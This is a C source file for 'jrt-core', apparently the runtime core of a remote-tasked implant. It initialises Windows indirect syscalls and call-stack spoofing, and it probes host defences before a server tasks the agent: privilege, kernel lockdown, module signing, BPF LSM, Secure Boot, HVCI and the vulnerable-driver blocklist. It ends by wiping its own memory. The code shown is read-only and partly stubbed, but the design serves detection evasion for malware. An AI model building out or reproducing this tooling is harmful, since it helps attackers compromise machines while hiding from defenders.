/*
 * jrt-core: runtime entry point (Implementation Plan §2, §5).
 *
 * jrt_init()  — resolve the indirect syscall layer (Windows), probe the
 *               host environment and privilege, return an opaque context.
 * jrt_cleanup() — wipe and release every tracked allocation, zero the context.
 *
 * The probe is read-only and never modifies system state (the agent reports
 * capability and the server decides what to task — §5).
 */

#include "jrt_core.h"
#include "allocator/allocator.h"

#ifdef JRT_TARGET_WINDOWS
#include "syscall/syscall_win.h"
#include "spoof/spoof.h"
#else
#include "syscall/syscall_linux.h"
#endif

#include <stddef.h>

#define JRT_O_RDONLY 0

/* One static context — the runtime is single-instance per process, and this
 * avoids depending on a heap allocator before jrt_init() has run. */
static JrtContext g_ctx;

/* Read a small text file into buf (NUL-terminated). Returns bytes read, or
 * a negative value. Used only for read-only sysfs/procfs probing. */
#ifdef JRT_TARGET_LINUX
static int jrt_read_file(const char* path, char* buf, int buf_size) {
    int fd = jrt_openat(-100 /* AT_FDCWD */, path, JRT_O_RDONLY, 0);
    if (fd < 0) return -1;
    long n = jrt_read(fd, buf, (size_t)(buf_size - 1));
    jrt_close(fd);
    if (n < 0) return -2;
    buf[n] = '\0';
    return (int)n;
}

/* Does the file's content contain the substring `needle`? */
static int jrt_file_contains(const char* path, const char* needle) {
    char buf[256];
    if (jrt_read_file(path, buf, sizeof(buf)) <= 0) return 0;
    for (int i = 0; buf[i]; i++) {
        int j = 0;
        while (needle[j] && buf[i + j] == needle[j]) j++;
        if (!needle[j]) return 1;
    }
    return 0;
}
#endif

static void jrt_probe_environment(JrtContext* c) {
#ifdef JRT_TARGET_WINDOWS
    /* Windows probe: privilege via token query, HVCI via
     * NtQuerySystemInformation(SystemCodeIntegrityInformation), secure boot
     * and the vulnerable-driver blocklist via registry reads. The exact
     * syscall sequences are completed with jrt-blind (Phase 6), which owns
     * the kernel-facing capability model. */
    c->is_elevated = 0;
    c->privilege = JRT_PRIV_L0;
    c->hvci = 0;
    c->secure_boot = 0;
    c->vulnerable_driver_blocklist = 0;
#else
    /* Linux probe — all read-only. */
    c->is_elevated = (jrt_getuid() == 0);
    c->privilege = c->is_elevated ? JRT_PRIV_L1 : JRT_PRIV_L0;

    c->lockdown = jrt_file_contains("/sys/kernel/security/lockdown", "[integrity]") ||
                  jrt_file_contains("/sys/kernel/security/lockdown", "[confidentiality]");
    c->module_sig_enforce =
        jrt_file_contains("/sys/module/module/parameters/sig_enforce", "Y");
    c->bpf_lsm = jrt_file_contains("/sys/kernel/security/lsm", "bpf");
    c->audit_immutable = 0;   /* requires an audit netlink query (Phase 6) */

    /* SecureBoot efivar: 4-byte attribute prefix then the value byte. */
    {
        char sb[8];
        int n = jrt_read_file(
            "/sys/firmware/efi/efivars/"
            "SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c", sb, sizeof(sb));
        c->secure_boot = (n >= 5 && sb[4] == 1) ? 1 : 0;
    }

    c->hvci = 0;   /* Windows concept */
#endif
    c->is_x86_64 = 1;   /* this build targets x86-64 */
}

JrtContext* jrt_init(void) {
    JrtContext* c = &g_ctx;

    c->abi_version = JRT_ABI_VERSION;
    c->build_seed = 0;
    c->syscalls_resolved = 0;

#ifdef JRT_TARGET_WINDOWS
    /* Resolve SSNs + syscall;ret gadgets before anything calls jrt_syscall. */
    c->syscalls_resolved = jrt_resolve_syscalls();
    jrt_spoof_init();
#endif

    jrt_probe_environment(c);

    return c;
}

void jrt_cleanup(JrtContext* ctx) {
    /* Wipe + free every tracked allocation (heap equivalent of stack zero). */
    jrt_cleanup_all();

    if (ctx) {
        volatile uint8_t* p = (volatile uint8_t*)ctx;
        for (size_t i = 0; i < sizeof(JrtContext); i++) p[i] = 0;
    }
}
